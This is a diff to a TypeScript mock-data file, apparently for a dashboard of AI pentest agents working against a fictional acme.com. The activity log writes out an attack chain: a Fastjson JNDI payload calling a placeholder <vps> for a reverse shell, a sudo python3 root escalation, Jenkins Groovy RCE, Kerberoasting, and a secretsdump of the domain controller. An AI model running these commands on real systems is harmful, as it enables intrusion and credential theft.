@@ -143,6 +143,15 @@ export const assets: Asset[] = [
   { id: 16, type: "endpoint", company_id: 1, task_ids: [2], url: "https://api.acme.com/v1/users/me", method: "GET", status_code: 200, last_seen: T("2026-07-26T02:12:00Z") },
   { id: 17, type: "endpoint", company_id: 1, task_ids: [1], url: "https://admin.acme.com/login", method: "POST", status_code: 200, params: [{ name: "username" }, { name: "password" }], last_seen: T("2026-07-26T02:13:00Z") },
   { id: 18, type: "endpoint", company_id: 1, task_ids: [1], url: "https://www.acme.com/search", method: "GET", status_code: 200, params: [{ name: "q", in: "query" }], last_seen: T("2026-07-26T02:14:00Z") },
+  // 内网资产（DMZ→内网横向发现）
+  { id: 19, type: "ip", company_id: 1, task_ids: [1], ip: "10.0.20.15", c_segment: "10.0.20.0", open_ports: [{ port: 80, service: "http" }, { port: 22, service: "ssh" }], last_seen: T("2026-07-25T15:40:00Z") },
+  { id: 20, type: "ip", company_id: 1, task_ids: [1], ip: "10.10.10.10", c_segment: "10.10.10.0", open_ports: [{ port: 88, service: "kerberos" }, { port: 389, service: "ldap" }, { port: 445, service: "smb" }], last_seen: T("2026-07-25T21:00:00Z") },
+  { id: 21, type: "ip", company_id: 1, task_ids: [1], ip: "10.10.10.5", c_segment: "10.10.10.0", open_ports: [{ port: 445, service: "smb" }], last_seen: T("2026-07-25T21:00:00Z") },
+  { id: 22, type: "ip", company_id: 1, task_ids: [1], ip: "10.10.10.20", c_segment: "10.10.10.0", open_ports: [{ port: 8080, service: "http-proxy" }], last_seen: T("2026-07-25T21:00:00Z") },
+  { id: 23, type: "service", company_id: 1, task_ids: [1], ip: "10.10.10.20", port: 8080, service_type: "http", service_name: "Jenkins 2.289", last_seen: T("2026-07-25T21:35:00Z") },
+  { id: 24, type: "service", company_id: 1, task_ids: [1], ip: "10.10.10.10", port: 445, service_type: "smb", service_name: "Windows Server 2019 DC", last_seen: T("2026-07-25T23:55:00Z") },
+  { id: 25, type: "app", company_id: 1, task_ids: [1], url: "http://10.10.10.20:8080", app_name: "Jenkins (内部)", category: "ci", status_code: 200, content_length: 14200, page_title: "Jenkins Dashboard", technologies: ["Jenkins", "Java"], last_seen: T("2026-07-25T21:35:00Z") },
+  { id: 26, type: "endpoint", company_id: 1, task_ids: [1], url: "http://10.10.10.20:8080/script", method: "GET", status_code: 200, last_seen: T("2026-07-25T21:35:00Z") },
 ];
 
 export const assetCounts: Record<string, number> = assets.reduce<Record<string, number>>((m, a) => {
@@ -162,6 +171,14 @@ export const findings: Finding[] = [
   { id: "f-8", vulnclass: "Missing Rate Limit", severity: "medium", summary: "登录接口无速率限制，可暴力破解", evidence: "1000 次/分钟无锁定，无验证码。", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T18:40:00Z") },
   { id: "f-9", vulnclass: "Verbose Error", severity: "low", summary: "API 500 返回堆栈，泄露路径与框架版本", evidence: "触发 500 返回 Node.js 堆栈，泄露绝对路径与依赖版本。", task_id: "t-acme-api", task_description: "api.acme.com 越权与注入测试", ts: T("2026-07-25T23:05:00Z") },
   { id: "f-10", vulnclass: "Outdated Component", severity: "medium", summary: "shop 使用存在已知 RCE 的老版本组件", evidence: "指纹识别到组件 v2.3.1，对应 CVE-2024-xxxx 反序列化 RCE。", task_id: "t-shop-pay", task_description: "shop.acme.com 支付与订单链路", ts: T("2026-07-23T15:00:00Z") },
+  // ── 外网→内网纵深链路上的高危发现（active task）──
+  { id: "f-11", vulnclass: "Hardcoded Credentials", severity: "high", summary: "泄露源码中硬编码数据库凭据 sa/Acme@2021", evidence: "git-dumper 还原 www.acme.com/.git 得到 config.php，内含明文 DB 口令，后续被证实可在内网复用。", intent_id: "ig", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T20:36:00Z") },
+  { id: "f-12", vulnclass: "Deserialization RCE", severity: "high", summary: "shop.acme.com Fastjson 1.2.24 反序列化远程命令执行", evidence: "POST /api/import 提交 JNDI payload（@type:JdbcRowSetImpl）→ 回连 dnslog 并落地反弹 shell（www-data@dmz-web01）。", intent_id: "i7", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T15:40:00Z") },
+  { id: "f-13", vulnclass: "Privilege Escalation", severity: "high", summary: "DMZ 立足点 sudo NOPASSWD 错配可本地提权 root", evidence: "sudo -l 显示 (ALL) NOPASSWD: /usr/bin/python3 → sudo python3 -c 'os.setuid(0);os.system(\"/bin/sh\")' 直接拿 root。", intent_id: "i8", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T16:20:00Z") },
+  { id: "f-14", vulnclass: "Network Segmentation", severity: "medium", summary: "DMZ 主机双网卡直连内网，边界隔离失效", evidence: "dmz-web01 第二网卡在 10.10.10.0/24，可从 DMZ 直达域控/文件服务器/Jenkins，越过网络分区。", intent_id: "i9", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T21:00:00Z") },
+  { id: "f-15", vulnclass: "Unauthenticated RCE", severity: "high", summary: "内部 Jenkins 未授权 Script Console 远程命令执行", evidence: "GET /script 无需登录即可执行 Groovy：'whoami'.execute().text → SYSTEM；并从凭据库导出域账号 acme\\svc_deploy。", intent_id: "i11", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T21:50:00Z") },
+  { id: "f-16", vulnclass: "Kerberoasting", severity: "high", summary: "域服务账号 svc_sql 可被 Kerberoast 且口令弱", evidence: "GetUserSPNs 请求 svc_sql 的 TGS，hashcat -m 13100 离线破出 Sql@2020，该账号属于 SQL 管理组。", intent_id: "i12", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-25T23:20:00Z") },
+  { id: "f-17", vulnclass: "Domain Compromise", severity: "high", summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成", evidence: "svc_deploy 属于 Domain Admins，psexec.py 以其登录 DC01 得 SYSTEM，secretsdump 导出全域 NTLM 哈希（含 krbtgt），完成靶标控制。", intent_id: "i13", task_id: "t-acme-web", task_description: "Acme 官网与后台外部渗透", ts: T("2026-07-26T00:20:00Z") },
 ];
 
 // ── Exploration graph (active task) ──────────────────────────────────────────
@@ -172,41 +189,124 @@ const P = (o: Record<string, string>) => JSON.stringify(o);
 
 export const explorationGraph: { nodes: TaskNode[]; edges: Edge[] } = {
   nodes: [
-    { id: "root", type: "fact", payload: P({ summary: "根：acme.com 外部渗透" }), priority: 0, state: "origin", origin: "system", ts: T("2026-07-24T09:12:00Z") },
-    // 目标（由 goals agent 拆解）
-    { id: "g1", type: "goal", payload: P({ text: "获取后台管理权限" }), priority: 9, state: "met", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
+    { id: "root", type: "fact", payload: P({ summary: "根：acme.com 外网→内网纵深渗透" }), priority: 0, state: "origin", origin: "system", ts: T("2026-07-24T09:12:00Z") },
+
+    // ── 目标（由 goals agent 拆解，随发现逐步加码到内网靶标）──
+    { id: "g1", type: "goal", payload: P({ text: "获取 acme.com 后台管理权限" }), priority: 9, state: "met", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
     { id: "g2", type: "goal", payload: P({ text: "读取用户敏感数据" }), priority: 8, state: "open", origin: "goals", ts: T("2026-07-24T09:13:00Z") },
-    // 意图（由 planner 从目标派生）
+    { id: "g3", type: "goal", payload: P({ text: "从外网突破 DMZ，建立内网立足点" }), priority: 9, state: "met", origin: "goals", ts: T("2026-07-25T14:10:00Z") },
+    { id: "g4", type: "goal", payload: P({ text: "内网横向，拿下内部靶标域控 DC01" }), priority: 10, state: "met", origin: "goals", ts: T("2026-07-25T20:00:00Z") },
+
+    // ── 第 1 层 · 外网侦察 / 外部漏洞 ──
     { id: "i1", type: "intent", payload: P({ summary: "acme.com 子域枚举与端口扫描" }), priority: 6, state: "done", origin: "planner", ts: T("2026-07-24T09:20:00Z") },
     { id: "i2", type: "intent", payload: P({ summary: "admin 后台默认口令 / 弱口令测试" }), priority: 9, state: "done", origin: "planner", ts: T("2026-07-26T03:30:00Z") },
     { id: "i3", type: "intent", payload: P({ summary: "枚举后台功能与用户数据接口" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T03:55:00Z") },
     { id: "i4", type: "intent", payload: P({ summary: "www.acme.com/search 页 SQL 注入探测" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T22:00:00Z") },
     { id: "i5", type: "intent", payload: P({ summary: "api.acme.com 订单接口越权(IDOR)测试" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T02:30:00Z") },
-    // 事实
+    { id: "ig", type: "intent", payload: P({ summary: "www.acme.com .git 源码泄露与硬编码凭据提取" }), priority: 7, state: "done", origin: "planner", ts: T("2026-07-25T20:20:00Z") },
+
+    // ── 第 2 层 · 突破 DMZ 建立立足点 ──
+    { id: "i6", type: "intent", payload: P({ summary: "shop.acme.com 组件指纹识别与 CVE 关联" }), priority: 7, state: "done", origin: "planner", ts: T("2026-07-25T14:20:00Z") },
+    { id: "i7", type: "intent", payload: P({ summary: "触发 shop 反序列化 RCE，获取反弹 shell" }), priority: 9, state: "done", origin: "planner", ts: T("2026-07-25T15:10:00Z") },
+    { id: "i8", type: "intent", payload: P({ summary: "DMZ 立足点本地信息收集与提权至 root" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T16:00:00Z") },
+
+    // ── 第 3 层 · 内网横向纵深（多层测试）──
+    { id: "i9", type: "intent", payload: P({ summary: "以立足点为 pivot 做内网主机发现" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T20:30:00Z") },
+    { id: "i10", type: "intent", payload: P({ summary: "内网凭据复用与密码喷洒" }), priority: 8, state: "running", origin: "planner", ts: T("2026-07-26T03:40:00Z") },
+    { id: "i11", type: "intent", payload: P({ summary: "内部 Jenkins 未授权 Groovy 脚本执行(RCE)" }), priority: 9, state: "done", origin: "planner", ts: T("2026-07-25T21:30:00Z") },
+    { id: "i12", type: "intent", payload: P({ summary: "对域服务账号做 Kerberoasting 并离线破解" }), priority: 8, state: "done", origin: "planner", ts: T("2026-07-25T22:40:00Z") },
+    { id: "i13", type: "intent", payload: P({ summary: "用域管理员凭据登录并控制域控 DC01" }), priority: 10, state: "done", origin: "planner", ts: T("2026-07-25T23:50:00Z") },
+
+    // ── 事实 ──
     { id: "fa1", type: "fact", payload: P({ summary: "发现子域 admin.acme.com（Element-UI 后台）" }), priority: 0, state: "open", origin: "work#1", ts: T("2026-07-24T09:40:00Z") },
     { id: "fa2", type: "fact", payload: P({ summary: "search 页 q 参数为 error-based 注入点(MSSQL)" }), priority: 0, state: "open", origin: "work#4", ts: T("2026-07-25T22:05:00Z") },
-    // 漏洞
+    { id: "faGit", type: "fact", payload: P({ summary: ".git 可下载，git-dumper 还原出后端源码" }), priority: 0, state: "open", origin: "workG", ts: T("2026-07-25T20:30:00Z") },
+    { id: "faCreds", type: "fact", payload: P({ summary: "源码 config.php 硬编码 DB 口令 sa / Acme@2021（疑似内网通用）" }), priority: 0, state: "open", origin: "workG", ts: T("2026-07-25T20:35:00Z") },
+    { id: "fa3", type: "fact", payload: P({ summary: "shop 指纹命中 Fastjson 1.2.24（存在已知反序列化 RCE）" }), priority: 0, state: "open", origin: "work#6", ts: T("2026-07-25T14:40:00Z") },
+    { id: "fa4", type: "fact", payload: P({ summary: "反弹 shell 成功：www-data@dmz-web01(10.0.20.15)，位于 DMZ 段" }), priority: 0, state: "open", origin: "work#7", ts: T("2026-07-25T15:40:00Z") },
+    { id: "fa5", type: "fact", payload: P({ summary: "sudo -l：(ALL) NOPASSWD: /usr/bin/python3 → 可提权 root" }), priority: 0, state: "open", origin: "work#8", ts: T("2026-07-25T16:20:00Z") },
+    { id: "fa6", type: "fact", payload: P({ summary: "立足点第二网卡直连内网 10.10.10.0/24（跨越 DMZ 边界）" }), priority: 0, state: "open", origin: "work#9", ts: T("2026-07-25T20:40:00Z") },
+    { id: "fa7", type: "fact", payload: P({ summary: "内网存活：10.10.10.10 DC01(域控) / 10.10.10.5 FS01(SMB) / 10.10.10.20 JENKINS" }), priority: 0, state: "open", origin: "work#9", ts: T("2026-07-25T21:00:00Z") },
+    { id: "fa8", type: "fact", payload: P({ summary: "JENKINS 控制台 /script 无鉴权，可直接执行 Groovy" }), priority: 0, state: "open", origin: "work#11", ts: T("2026-07-25T21:45:00Z") },
+    { id: "fa9", type: "fact", payload: P({ summary: "从 Jenkins 凭据库导出域账号 acme\\svc_deploy 明文口令" }), priority: 0, state: "open", origin: "work#11", ts: T("2026-07-25T22:10:00Z") },
+    { id: "fa10", type: "fact", payload: P({ summary: "Kerberoast 到 svc_sql 的 TGS，hashcat 破出口令 Sql@2020" }), priority: 0, state: "open", origin: "work#12", ts: T("2026-07-25T23:20:00Z") },
+
+    // ── 漏洞 ──
     { id: "fi1", type: "finding", payload: P({ summary: "后台默认口令 admin/admin123" }), priority: 0, state: "confirmed", origin: "work#2", ts: T("2026-07-26T03:50:00Z") },
     { id: "fi2", type: "finding", payload: P({ summary: "SQL 注入（search q）可读 acme_prod 库" }), priority: 0, state: "confirmed", origin: "work#4", ts: T("2026-07-26T01:20:00Z") },
     { id: "fi3", type: "finding", payload: P({ summary: "IDOR：/v1/orders?id= 可越权读他人订单" }), priority: 0, state: "confirmed", origin: "work#5", ts: T("2026-07-26T02:44:00Z") },
-    // 提示（主 agent 注入）
+    { id: "fiSrc", type: "finding", payload: P({ summary: "源码泄露 + 硬编码数据库凭据（sa/Acme@2021）" }), priority: 0, state: "confirmed", origin: "workG", ts: T("2026-07-25T20:36:00Z") },
+    { id: "fiRce", type: "finding", payload: P({ summary: "shop Fastjson 反序列化 RCE，获得服务器命令执行" }), priority: 0, state: "confirmed", origin: "work#7", ts: T("2026-07-25T15:40:00Z") },
+    { id: "fiPriv", type: "finding", payload: P({ summary: "DMZ 立足点本地提权至 root（sudo NOPASSWD 错配）" }), priority: 0, state: "confirmed", origin: "work#8", ts: T("2026-07-25T16:20:00Z") },
+    { id: "fiJenkins", type: "finding", payload: P({ summary: "内部 Jenkins 未授权 Groovy → 服务器 RCE" }), priority: 0, state: "confirmed", origin: "work#11", ts: T("2026-07-25T21:50:00Z") },
+    { id: "fiKerb", type: "finding", payload: P({ summary: "Kerberoasting 破解域服务账号 svc_sql 口令" }), priority: 0, state: "confirmed", origin: "work#12", ts: T("2026-07-25T23:20:00Z") },
+    { id: "fiDC", type: "finding", payload: P({ summary: "拿下域控 DC01（Domain Admin）—— 内部靶标达成" }), priority: 0, state: "confirmed", origin: "work#13", ts: T("2026-07-26T00:20:00Z") },
+
+    // ── 提示（主 agent 注入）──
     { id: "h1", type: "hint", payload: P({ summary: "后台是 Element-UI，优先跑默认口令表" }), priority: 5, state: "consumed", origin: "mainagent", ts: T("2026-07-26T03:20:00Z") },
+    { id: "h2", type: "hint", payload: P({ summary: "内网优先打 Jenkins：未授权 /script 直接 Groovy RCE" }), priority: 6, state: "consumed", origin: "mainagent", ts: T("2026-07-25T21:20:00Z") },
+    { id: "h3", type: "hint", payload: P({ summary: "源码里那组 DB 口令拿去内网喷洒，大概率通用" }), priority: 6, state: "consumed", origin: "mainagent", ts: T("2026-07-25T23:10:00Z") },
   ],
   edges: [
+    // 根 → 目标
     { src: "root", dst: "g1", rel: "spawns" },
     { src: "root", dst: "g2", rel: "spawns" },
+    { src: "root", dst: "g3", rel: "spawns" },
+    { src: "root", dst: "g4", rel: "spawns" },
+    // 目标 → 意图
     { src: "g1", dst: "i1", rel: "spawns" },
     { src: "g1", dst: "i2", rel: "spawns" },
     { src: "g1", dst: "i3", rel: "spawns" },
     { src: "g2", dst: "i4", rel: "spawns" },
     { src: "g2", dst: "i5", rel: "spawns" },
+    { src: "g2", dst: "ig", rel: "spawns" },
+    { src: "g3", dst: "i6", rel: "spawns" },
+    { src: "g3", dst: "i7", rel: "spawns" },
+    { src: "g3", dst: "i8", rel: "spawns" },
+    { src: "g4", dst: "i9", rel: "spawns" },
+    { src: "g4", dst: "i10", rel: "spawns" },
+    { src: "g4", dst: "i11", rel: "spawns" },
+    { src: "g4", dst: "i12", rel: "spawns" },
+    { src: "g4", dst: "i13", rel: "spawns" },
+    // 意图 → 事实 / 漏洞（产出）
     { src: "i1", dst: "fa1", rel: "yields" },
     { src: "i4", dst: "fa2", rel: "yields" },
     { src: "i2", dst: "fi1", rel: "yields" },
     { src: "i4", dst: "fi2", rel: "yields" },
     { src: "i5", dst: "fi3", rel: "yields" },
-    { src: "fi1", dst: "g1", rel: "proves" },
+    { src: "ig", dst: "faGit", rel: "yields" },
+    { src: "ig", dst: "faCreds", rel: "yields" },
+    { src: "ig", dst: "fiSrc", rel: "yields" },
+    { src: "i6", dst: "fa3", rel: "yields" },
+    { src: "i7", dst: "fa4", rel: "yields" },
+    { src: "i7", dst: "fiRce", rel: "yields" },
+    { src: "i8", dst: "fa5", rel: "yields" },
+    { src: "i8", dst: "fiPriv", rel: "yields" },
+    { src: "i9", dst: "fa6", rel: "yields" },
+    { src: "i9", dst: "fa7", rel: "yields" },
+    { src: "i11", dst: "fa8", rel: "yields" },
+    { src: "i11", dst: "fa9", rel: "yields" },
+    { src: "i11", dst: "fiJenkins", rel: "yields" },
+    { src: "i12", dst: "fa10", rel: "yields" },
+    { src: "i12", dst: "fiKerb", rel: "yields" },
+    { src: "i13", dst: "fiDC", rel: "yields" },
+    // 事实 → 新意图（事实驱动的多层递进）
+    { src: "fa3", dst: "i7", rel: "derived_from" },
+    { src: "fa4", dst: "i8", rel: "derived_from" },
+    { src: "fa4", dst: "i9", rel: "derived_from" },
+    { src: "faCreds", dst: "i10", rel: "derived_from" },
+    { src: "fa7", dst: "i11", rel: "derived_from" },
+    { src: "fa7", dst: "i12", rel: "derived_from" },
+    { src: "fa9", dst: "i13", rel: "derived_from" },
+    { src: "fa10", dst: "i13", rel: "derived_from" },
+    // 提示 → 意图
     { src: "h1", dst: "i2", rel: "derived_from" },
+    { src: "h2", dst: "i11", rel: "derived_from" },
+    { src: "h3", dst: "i10", rel: "derived_from" },
+    // 漏洞 → 证明目标达成
+    { src: "fi1", dst: "g1", rel: "proves" },
+    { src: "fiRce", dst: "g3", rel: "proves" },
+    { src: "fiDC", dst: "g4", rel: "proves" },
   ],
 };
 
@@ -222,7 +322,13 @@ export const activity: Activity[] = [
   { seq: 1, worker: "planner", ts: T("2026-07-24T09:12:10Z"), kind: "round", summary: "第 0 轮 · 目标拆解" },
   { seq: 2, worker: "planner", ts: T("2026-07-24T09:12:30Z"), kind: "thinking", summary: "acme.com 是企业站，攻击面：官网(www)、后台(admin)、API(api)、商城(shop)。先枚举资产，再挑高价值目标。" },
   { seq: 3, worker: "planner", ts: T("2026-07-24T09:13:00Z"), kind: "text", summary: "拆出两个目标：① 获取后台管理权限 ② 读取用户敏感数据。派生首批意图：子域枚举、后台口令测试、注入探测、API 越权。" },
-  { seq: 4, worker: "planner", ts: T("2026-07-26T03:55:00Z"), kind: "round", summary: "第 3 轮 · 复盘" },
+  { seq: 300, worker: "planner", ts: T("2026-07-25T14:12:00Z"), kind: "round", summary: "第 1 轮 · 攻击面加码" },
+  { seq: 301, worker: "planner", ts: T("2026-07-25T14:12:20Z"), kind: "text", summary: ".git 泄露出源码+硬编码 DB 口令，shop 指纹疑似 Fastjson。新增目标③「突破 DMZ 建立内网立足点」，派生指纹关联、反序列化 RCE 两条意图。" },
+  { seq: 302, worker: "planner", ts: T("2026-07-25T20:25:00Z"), kind: "round", summary: "第 2 轮 · 立足点已建，转内网" },
+  { seq: 303, worker: "planner", ts: T("2026-07-25T20:26:00Z"), kind: "text", summary: "RCE 拿到 www-data 并提权 root，立足点双网卡直连 10.10.10.0/24（g3 达成）。新增目标④「拿下内部靶标 DC01」，派生内网主机发现、凭据复用、Jenkins 利用、Kerberoasting 四条意图。" },
+  { seq: 304, worker: "planner", ts: T("2026-07-26T00:25:00Z"), kind: "round", summary: "第 3 轮 · 靶标达成复盘" },
+  { seq: 305, worker: "planner", ts: T("2026-07-26T00:26:00Z"), kind: "text", summary: "svc_deploy 属于 Domain Admins，已 psexec 拿下 DC01 并 secretsdump 全域哈希（g4 达成）。内外网链路打通，收敛剩余 g2（后台批量用户数据）。" },
+  { seq: 4, worker: "planner", ts: T("2026-07-26T03:55:00Z"), kind: "round", summary: "第 4 轮 · 复盘" },
   { seq: 5, worker: "planner", ts: T("2026-07-26T03:55:10Z"), kind: "text", summary: "后台已拿下(g1 达成)。继续 g2：派生「枚举后台用户接口」「API IDOR 测试」两条意图并提高优先级。" },
 
   // work#1 · i1 子域枚举与端口扫描（done）
@@ -273,11 +379,98 @@ export const activity: Activity[] = [
   { seq: 62, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:57:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t61", summary: "{ \"total\": 12840, \"items\": [ { \"id\":1, \"email\":\"a***@acme.com\", \"phone\":\"139****\" } ] }", detail: "管理接口可分页返回全部用户（含邮箱/手机号），约 1.28 万条。" },
   { seq: 63, worker: "work#3", intent_id: "i3", ts: T("2026-07-26T03:58:20Z"), kind: "thinking", summary: "确认存在批量用户数据读取入口；导出动作命中破坏性/外泄规则，已提交拦截审批等待放行。" },
 
+  // workG · ig .git 源码泄露与硬编码凭据（done）
+  { seq: 310, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:26:00Z"), kind: "thinking", summary: "robots.txt 提到 /.git，先探测目录是否可下载，能拿源码就能白盒找注入点与硬编码密钥。" },
+  { seq: 311, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:27:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "tg1", summary: "curl -s -o /dev/null -w '%{http_code}' https://www.acme.com/.git/HEAD" },
+  { seq: 312, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:27:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "tg1", summary: "200", detail: ".git 目录对外可访问。" },
+  { seq: 313, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:28:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "tg2", summary: "git-dumper https://www.acme.com/.git/ /tmp/acme && git -C /tmp/acme log --oneline | head" },
+  { seq: 314, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:30:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "tg2", summary: "还原 214 个文件；HEAD=main。config.php / db.php 在列。", detail: "完整后端源码已还原到 /tmp/acme。" },
+  { seq: 315, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:34:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "tg3", summary: "grep -rniE 'password|pwd|secret|Data Source' /tmp/acme/config.php" },
+  { seq: 316, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:34:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "tg3", summary: "$db_user='sa'; $db_pass='Acme@2021'; $db_host='10.10.10.30';", detail: "硬编码数据库口令，且 host 指向内网 IP —— 记为疑似内网通用凭据。" },
+  { seq: 317, worker: "workG", intent_id: "ig", ts: T("2026-07-25T20:36:00Z"), kind: "result", summary: "源码泄露 + 硬编码 DB 凭据确认，凭据入图供后续内网复用。", input_tokens: 88000, output_tokens: 5200, cache_read_tokens: 60000, cache_write_tokens: 8000 },
+
+  // work#6 · i6 shop 指纹与 CVE 关联（done）
+  { seq: 320, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:22:00Z"), kind: "thinking", summary: "shop.acme.com 是自研电商，先指纹识别框架/组件版本，再对存在已知反序列化的组件下手。" },
+  { seq: 321, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:24:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t6a", summary: "curl -si https://shop.acme.com/ | grep -iE 'x-powered-by|server|jsessionid'" },
+  { seq: 322, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:24:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t6a", summary: "X-Powered-By: Servlet\nSet-Cookie: JSESSIONID=...", detail: "Java 技术栈，存在 /api/import 接受 JSON body。" },
+  { seq: 323, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:30:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t6b", summary: "curl -s -H 'Content-Type: application/json' -d '{\"a\":{\"@type\":\"java.lang.AutoCloseable\"}}' https://shop.acme.com/api/import" },
+  { seq: 324, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:31:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t6b", summary: "报错栈含 com.alibaba.fastjson.JSONException（1.2.24）", detail: "确认 Fastjson 1.2.24 —— 对应 JdbcRowSetImpl JNDI 注入 RCE。" },
+  { seq: 325, worker: "work#6", intent_id: "i6", ts: T("2026-07-25T14:40:00Z"), kind: "result", summary: "指纹命中 Fastjson 1.2.24，反序列化 RCE 面成立，交给利用意图。", input_tokens: 64000, output_tokens: 4100, cache_read_tokens: 42000, cache_write_tokens: 6000 },
+
+  // work#7 · i7 反序列化 RCE 拿反弹 shell（done，证明 g3）
+  { seq: 330, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:12:00Z"), kind: "thinking", summary: "起一个 JNDI/LDAP 恶意服务，让 shop 反连加载执行 payload，先 dnslog 验证出网，再落反弹 shell。" },
+  { seq: 331, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:15:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t7a", summary: "java -jar JNDIExploit.jar -i <vps> -l 1389 &  # 起 LDAP/HTTP 恶意服务" },
+  { seq: 332, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:16:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t7a", summary: "LDAP Server started on 1389, HTTP on 8180", detail: "恶意服务就绪。" },
+  { seq: 333, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:20:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t7b", summary: "curl -s -H 'Content-Type: application/json' -d '{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://<vps>:1389/Basic/ReverseShell/<vps>/4444\",\"autoCommit\":true}' https://shop.acme.com/api/import" },
+  { seq: 334, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:21:00Z"), kind: "tool_result", tool: "bash", tool_use_id: "t7b", summary: "LDAP 收到请求 → 加载 ReverseShell → nc 监听收到连接", detail: "payload 成功触发。" },
+  { seq: 335, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:24:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t7c", summary: "id; hostname -I  # 反弹 shell 内确认身份与网段" },
+  { seq: 336, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:24:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t7c", summary: "uid=33(www-data) gid=33 groups=33\n10.0.20.15 10.10.10.15", detail: "www-data@dmz-web01，且第二网卡 10.10.10.x —— 已进入 DMZ 且贴内网。" },
+  { seq: 337, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:30:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t7d", summary: "report_finding(Deserialization RCE, high)" },
+  { seq: 338, worker: "work#7", intent_id: "i7", ts: T("2026-07-25T15:40:00Z"), kind: "result", summary: "反序列化 RCE 拿到 www-data 反弹 shell，目标③立足点初步建立。", input_tokens: 132000, output_tokens: 8600, cache_read_tokens: 90000, cache_write_tokens: 12000 },
+
+  // work#8 · i8 立足点提权（done）
+  { seq: 340, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:02:00Z"), kind: "thinking", summary: "www-data 权限有限，先做本地信息收集找提权点：sudo 配置、SUID、内核版本。" },
+  { seq: 341, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:05:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t8a", summary: "sudo -n -l 2>/dev/null; find / -perm -4000 -type f 2>/dev/null | head" },
+  { seq: 342, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:05:03Z"), kind: "tool_result", tool: "bash", tool_use_id: "t8a", summary: "User www-data may run: (ALL) NOPASSWD: /usr/bin/python3", detail: "sudo 白名单里 python3 且免密 —— 直接可提权。" },
+  { seq: 343, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:10:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t8b", summary: "sudo python3 -c 'import os;os.setuid(0);os.system(\"id\")'" },
+  { seq: 344, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:10:02Z"), kind: "tool_result", tool: "bash", tool_use_id: "t8b", summary: "uid=0(root) gid=0(root) groups=0(root)", detail: "已提权 root。" },
+  { seq: 345, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:14:00Z"), kind: "tool_use", tool: "report_finding", tool_use_id: "t8c", summary: "report_finding(Privilege Escalation, high)" },
+  { seq: 346, worker: "work#8", intent_id: "i8", ts: T("2026-07-25T16:20:00Z"), kind: "result", summary: "本地提权 root 完成，立足点稳固；准备以其为 pivot 打内网。", input_tokens: 74000, output_tokens: 4700, cache_read_tokens: 50000, cache_write_tokens: 7000 },
+
+  // work#9 · i9 内网主机发现（done）
+  { seq: 350, worker: "work#9", intent_id: "i9", ts: T("2026-07-25T20:32:00Z"), kind: "thinking", summary: "立足点直连 10.10.10.0/24，用 fscan/内网扫描做主机与端口发现，圈定域控与高价值主机。" },
+  { seq: 351, worker: "work#9", intent_id: "i9", ts: T("2026-07-25T20:36:00Z"), kind: "tool_use", tool: "bash", tool_use_id: "t9a", summary: "./fscan -h 10.10.10.0/24 -np -nobr 2>&1 | tail -n 30" },
